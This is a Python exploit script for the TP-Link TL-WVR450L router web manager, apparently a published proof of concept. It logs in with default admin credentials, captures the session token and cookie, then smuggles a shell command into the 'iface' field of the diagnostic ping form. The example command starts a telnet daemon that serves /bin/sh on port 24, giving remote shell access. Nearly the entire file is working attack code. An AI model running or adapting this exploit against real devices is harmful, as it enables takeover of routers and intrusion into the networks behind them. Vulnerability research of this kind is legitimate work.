# Tested product: TL-WVR450L
# Hardware version：V1.0
# Firmware version: 20161125
# The RSA_Encryption_For_Tplink.js is use for Rsa Encryption to the password when login the web manager.
# You can download the RSA_Encryption_For_Tplink.js by https://github.com/coincoin7/Wireless-Router-Vulnerability/blob/master/RSA_Encryption_For_Tplink.js

import execjs
import requests
import json
import urllib


def read_js():
    file = open("./RSA_Encryption_For_Tplink.js", 'r')
    line = file.readline()
    js = ''
    while line:
        js = js + line
        line = file.readline()
    file.close()
    return js


def execute(ip, port, username, passwd, cmd):

    try:
        s = requests.session()


        uri = "http://{}:{}".format(ip,port)
        headers = {
            'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
            'Referer': 'http://{}/webpages/login.html'.format(ip)
            }
        payload = {
            "method":"get"
        }
        ret = s.post(uri + '/cgi-bin/luci/;stok=/login?form=login', data=urllib.urlencode({"data":json.dumps(payload)}), headers=headers, timeout=5)
        rsa_public_n = json.loads(ret.text)['result']['password'][0].encode("utf-8")
        rsa_public_e = json.loads(ret.text)['result']['password'][1].encode("utf-8")
        js = read_js()
        js_handle = execjs.compile(js)
        password = js_handle.call('MainEncrypt', rsa_public_n, rsa_public_e, passwd)


        payload = {
            "method":"login",
            "params":{
                "username":"{}".format(username),
                "password":"{}".format(password)
            }
        }
        ret = s.post(uri + '/cgi-bin/luci/;stok=/login?form=login', data=urllib.urlencode({"data":json.dumps(payload)}), headers=headers, timeout=5)
        stok = json.loads(ret.text)['result']['stok'].encode('utf-8')
        cookie = ret.headers['Set-Cookie']


        print '[+] Login success'
        print '[+] Get The Token: ' + stok
        print '[+] Get The Cookie: ' + cookie


        headers = {
            'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
            'Referer':'http://{}/webpages/login.html'.format(ip),
            'Cookie':'{}'.format(cookie)
            }
        payload = {
            "method":"start",
            "params":{
                "type":"0",
                "type_hidden":"0",
                "ipaddr_ping":"127.0.0.1",
                "iface_ping":"WAN1",
                "ipaddr":"127.0.0.1",
                "iface":";{}".format(cmd),
                "count":"1",
                "pktsize":"64",
                "my_result":"exploit"
            }
        }
        ret = s.post(uri + '/cgi-bin/luci/;stok={}/admin/diagnostic?form=diag'.format(stok), data=urllib.urlencode({"data":json.dumps(payload)}), headers=headers, timeout=5)


        #print ret.text
        print '[+] Finish RCE'
        print '--------------------------------------------------------------'
        return True

    except:
        return False


if __name__=='__main__':
    print '-----------Tplink LUCI diagnostic Authenticated RCE-----------'
    print execute('192.168.1.1', 80, 'admin', 'admin', 'telnetd -p 24 -l /bin/sh')